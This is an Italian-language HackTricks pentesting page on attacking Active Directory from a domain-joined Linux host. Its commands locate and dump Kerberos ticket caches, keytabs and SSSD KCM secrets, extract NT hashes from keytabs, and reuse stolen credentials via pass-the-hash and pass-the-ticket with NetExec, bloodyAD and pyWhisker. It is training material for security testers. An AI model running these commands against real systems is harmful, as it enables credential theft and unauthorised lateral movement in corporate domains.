# Active Directory Linux

{{#include ../../banners/hacktricks-training.md}}

Una macchina Linux può essere presente anche all'interno di un ambiente Active Directory.

Una macchina Linux all'interno di un AD può **archiviare localmente materiale Kerberos**: ccaches degli utenti, keytab delle macchine/dei servizi e secret gestiti da SSSD. Questi artefatti possono generalmente essere riutilizzati come qualsiasi altra credenziale Kerberos. Per leggere la maggior parte di essi è necessario essere l'utente proprietario del ticket oppure **root** sulla macchina.

## Enumeration

### Enumeration di AD da Linux

Se hai accesso a un AD da Linux (o a bash in Windows), puoi provare [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) per eseguire l'enumeration dell'AD.

Puoi anche consultare la pagina seguente per scoprire **altri modi per eseguire l'enumeration di AD da Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA è un'**alternativa** open-source a Microsoft Windows **Active Directory**, principalmente per ambienti **Unix**. Combina una directory **LDAP** completa con un MIT **Kerberos** Key Distribution Center per una gestione simile ad Active Directory. Utilizzando il **Certificate System** Dogtag per la gestione dei certificati CA e RA, supporta l'autenticazione **multi-factor**, incluse le smartcard. SSSD è integrato per i processi di autenticazione Unix. Scopri di più in:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefatti degli host domain-joined

Prima di toccare i ticket, identifica **come l'host è stato aggiunto ad AD** e **dove è realmente archiviato il materiale Kerberos**. Sugli host Linux moderni questo viene comunemente gestito da `realmd` + `adcli` + `sssd`, non solo da file statici in `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Questo ti indica rapidamente se l'host si fida di AD, se SSSD sta memorizzando nella cache identità o ticket e se sono disponibili **machine/service keytabs** o **KCM secrets** da sfruttare.

## Playing with tickets

### Pass The Ticket

In questa pagina troverai diversi punti in cui potresti **trovare ticket kerberos all'interno di un host Linux**; nella pagina seguente puoi imparare come trasformare questi formati di ticket CCache in Kirbi (il formato necessario per utilizzarli in Windows) e anche come eseguire un attacco PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Se vuoi consultare i workflow **Linux-specific ticket harvesting** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, ecc.), controlla la pagina dedicata:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

I file CCACHE sono formati binari per **memorizzare le credenziali Kerberos**. `FILE:/tmp/krb5cc_%{uid}` è ancora comune, ma le distribuzioni Linux moderne usano anche `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` o `KCM:%{uid}`. Controlla la variabile d'ambiente `KRB5CCNAME` e l'impostazione `default_ccache_name` prima di presumere che i ticket si trovino in `/tmp`.<sup>[[1]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Riutilizzo di ticket CCACHE dal keyring

**I ticket Kerberos archiviati nella memoria di un processo possono essere estratti**, in particolare quando la protezione ptrace della macchina è disabilitata (`/proc/sys/kernel/yama/ptrace_scope`). Uno strumento utile a questo scopo è disponibile all'indirizzo [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), che facilita l'estrazione tramite injection nelle sessioni e il dump dei ticket in `/tmp`.

Per configurare e utilizzare questo strumento, seguire i passaggi riportati di seguito:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Questa procedura tenterà di eseguire l'injection in varie sessioni, indicando il successo salvando i ticket estratti in `/tmp` secondo la convenzione di denominazione `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Riutilizzo dei ticket CCACHE da SSSD KCM

SSSD mantiene una copia del database nel percorso `/var/lib/sss/secrets/secrets.ldb`. La chiave corrispondente è memorizzata come file nascosto nel percorso `/var/lib/sss/secrets/.secrets.mkey`. Per impostazione predefinita, la chiave è leggibile solo con i permessi **root**.

L'esecuzione di **`SSSDKCMExtractor`** con i parametri --database e --key analizzerà il database e **decrittograferà i secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Il **blob della cache delle credenziali Kerberos può essere convertito in un file Kerberos CCache utilizzabile**, che può essere passato a Mimikatz/Rubeus.

### Quick triage del keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Estrazione degli account da /etc/krb5.keytab

Le chiavi degli account di servizio, essenziali per i servizi eseguiti con privilegi root, sono archiviate in modo sicuro nei file **`/etc/krb5.keytab`**. Queste chiavi, simili alle password dei servizi, richiedono la massima riservatezza.

Per esaminare il contenuto del file keytab, è possibile utilizzare **`klist`**. Su Linux, `klist -k -K -e` stampa i principal, i numeri di versione delle chiavi, i tipi di cifratura e il materiale grezzo delle chiavi. Se il tipo di chiave è **23 / RC4-HMAC**, il valore della chiave è anche l'**NT hash** di quel principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Per gli utenti Linux, **`KeyTabExtract`** offre funzionalità per estrarre l'hash RC4 HMAC, che può essere utilizzato per il riutilizzo dell'hash NTLM. Questa tecnica è utile solo quando il keytab contiene ancora materiale **etype 23 / RC4-HMAC**. Negli ambienti **AES-only** potresti non ottenere un hash NT riutilizzabile, ma puoi comunque autenticarti direttamente con il keytab tramite Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Su macOS, **`bifrost`** è uno strumento per l'analisi dei file keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizzando le informazioni sugli account e sugli hash estratte, è possibile stabilire connessioni ai server utilizzando strumenti come **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Riutilizzare l'account computer da `/etc/krb5.keytab`

Nei sistemi uniti tramite `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` contiene solitamente l'**account computer** e uno o più **host/service principals**. Se disponi di **root**, non limitarti a fare il dump: usa uno dei principals elencati da `klist -k` per richiedere un TGT e operare come lo stesso host Linux.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Questo è particolarmente utile quando è lo stesso **computer object** ad avere diritti delegati in AD o quando l'host è autorizzato a recuperare altri secret come un **gMSA**.

### Riutilizzare materiale Kerberos rubato con AD tooling Linux-first

Una volta ottenuto un `ccache` valido o un keytab utilizzabile, puoi operare su AD **direttamente da Linux** senza convertire prima tutto nei formati Windows. Molti tool moderni accettano nativamente `KRB5CCNAME` / l'autenticazione Kerberos:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Questo rappresenta un buon collegamento tra **Linux post-exploitation** e **AD object abuse**. Per i percorsi di abuso a livello di oggetto, consulta:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefatti Linux gMSA / Managed Service Account

Le distribuzioni Linux recenti possono utilizzare direttamente da AD i **Managed Service Accounts**. In pratica, ciò significa che, dopo aver compromesso un server Linux, potresti trovare non solo il keytab dell'host, ma anche **keytab specifici per il servizio** generati da un gMSA. I luoghi più comuni da esaminare sono `/etc/gmsad.conf`, i file di configurazione specifici del deployment e ulteriori file `*.keytab` sotto `/etc`.<sup>[[2]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Questo ti fornisce un'identità Kerberos riutilizzabile per gli SPN associati a quel gMSA **senza toccare alcun endpoint Windows**. Per l'abuso di gMSA/dMSA **lato dominio** dopo aver ottenuto privilegi più elevati in AD, consulta:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Riferimenti

- [1] [Kerberos (II): come attaccare Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Accesso ad AD con un managed service account – Integrazione diretta dei sistemi RHEL con Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
